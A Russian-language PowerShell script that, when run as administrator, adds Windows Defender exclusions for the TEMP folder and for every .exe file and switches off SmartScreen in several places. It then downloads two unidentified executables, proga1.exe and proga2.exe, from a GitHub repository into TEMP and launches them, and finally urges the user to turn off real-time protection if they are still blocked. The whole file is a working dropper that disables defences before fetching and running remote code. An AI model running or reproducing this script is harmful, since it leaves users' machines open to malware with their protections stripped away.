<#
.SYNOPSIS
    Скачивает proga1.exe и proga2.exe, добавляет их в исключения Defender,
    отключает SmartScreen и запускает файлы.
#>

# ========== ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА ==========
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Write-Host "Запустите скрипт от имени Администратора!" -ForegroundColor Red
    Write-Host "Нажмите любую клавишу для выхода..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit
}

Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "  Добавление исключений, отключение SmartScreen"    -ForegroundColor Cyan
Write-Host "  Скачивание и запуск файлов"                       -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan

$temp = $env:TEMP
$dest1 = "$temp\proga1.exe"
$dest2 = "$temp\proga2.exe"

# ========== 1. ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ ==========
Write-Host "`n[1/4] Добавление исключений в Defender..." -ForegroundColor Yellow

# Через PowerShell cmdlet
try {
    Add-MpPreference -ExclusionPath $dest1 -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $dest2 -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $temp -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
    Write-Host "  Исключения добавлены (через Add-MpPreference)" -ForegroundColor Green
} catch {
    Write-Host "  Не удалось добавить через Add-MpPreference" -ForegroundColor DarkYellow
}

# Через реестр (дублируем для надёжности)
try {
    $path = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    if (!(Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
    New-ItemProperty -Path $path -Name $dest1 -Value 0 -Type DWord -Force | Out-Null
    New-ItemProperty -Path $path -Name $dest2 -Value 0 -Type DWord -Force | Out-Null
    New-ItemProperty -Path $path -Name $temp -Value 0 -Type DWord -Force | Out-Null
    Write-Host "  Исключения добавлены в реестр" -ForegroundColor Green
} catch {
    Write-Host "  Не удалось добавить через реестр" -ForegroundColor DarkYellow
}

# ========== 2. ОТКЛЮЧЕНИЕ SMARTSCREEN ==========
Write-Host "`n[2/4] Отключение SmartScreen..." -ForegroundColor Yellow
try {
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction Stop
    Write-Host "  SmartScreen для Проводника: ВЫКЛ" -ForegroundColor Green
} catch {
    Write-Host "  Не удалось отключить SmartScreen для Проводника" -ForegroundColor DarkYellow
}
try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Edge\SmartScreenEnabled" -Name "(Default)" -Value 0 -Force -ErrorAction Stop
    Write-Host "  SmartScreen для Edge: ВЫКЛ" -ForegroundColor Green
} catch {}
try {
    reg add "HKLM\Software\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f 2>&1 | Out-Null
    Write-Host "  SmartScreen системный: ВЫКЛ" -ForegroundColor Green
} catch {}

# ========== 3. СКАЧИВАНИЕ ФАЙЛОВ ==========
Write-Host "`n[3/4] Скачивание файлов..." -ForegroundColor Yellow

function Download-File {
    param($url, $dest)
    if (Test-Path $dest) { Remove-Item $dest -Force -ErrorAction SilentlyContinue }
    try {
        Write-Host "  Скачивание: $(Split-Path $dest -Leaf)" -ForegroundColor Gray
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $wc.DownloadFile($url, $dest)
        $wc.Dispose()
        return $true
    } catch {
        Write-Host "  Ошибка: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"

$ok1 = Download-File $url1 $dest1
$ok2 = Download-File $url2 $dest2

if ($ok1) { Write-Host "  proga1.exe: ОК" -ForegroundColor Green }
if ($ok2) { Write-Host "  proga2.exe: ОК" -ForegroundColor Green }

# Если proga2.exe не скачался, копируем из proga1.exe
if ((-not $ok2) -and (Test-Path $dest1)) {
    Write-Host "  proga2.exe не найден, копируем из proga1.exe" -ForegroundColor Yellow
    Copy-Item $dest1 $dest2 -Force
    $ok2 = $true
}

# ========== 4. ЗАПУСК ФАЙЛОВ ==========
Write-Host "`n[4/4] Запуск файлов..." -ForegroundColor Yellow

function Run-File {
    param($path, $name)
    if (-not (Test-Path $path)) {
        Write-Host "  $name не найден" -ForegroundColor Red
        return $false
    }
    # Запускаем через cmd /c start (обходит некоторые блокировки PowerShell)
    try {
        cmd /c start "" "$path" 2>&1 | Out-Null
        Write-Host "  $name запущен" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "  Не удалось запустить $name через cmd, пробуем напрямую" -ForegroundColor DarkYellow
        try {
            Start-Process -FilePath $path -WindowStyle Normal -ErrorAction Stop
            Write-Host "  $name запущен через Start-Process" -ForegroundColor Green
            return $true
        } catch {
            Write-Host "  Ошибка запуска $name : $($_.Exception.Message)" -ForegroundColor Red
            return $false
        }
    }
}

Run-File $dest1 "proga1.exe"
Start-Sleep -Seconds 1
Run-File $dest2 "proga2.exe"

Write-Host "`n==================================================" -ForegroundColor Green
Write-Host "  ГОТОВО! Если файлы всё ещё блокируются:" -ForegroundColor Yellow
Write-Host "  1. Вручную отключите 'Защиту в реальном времени' в Defender" -ForegroundColor Yellow
Write-Host "  2. Затем запустите скрипт снова" -ForegroundColor Yellow
Write-Host "  3. Или перезагрузитесь в безопасном режиме и запустите скрипт" -ForegroundColor Yellow
Write-Host "==================================================" -ForegroundColor Green

Write-Host "`nНажмите любую клавишу для выхода..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
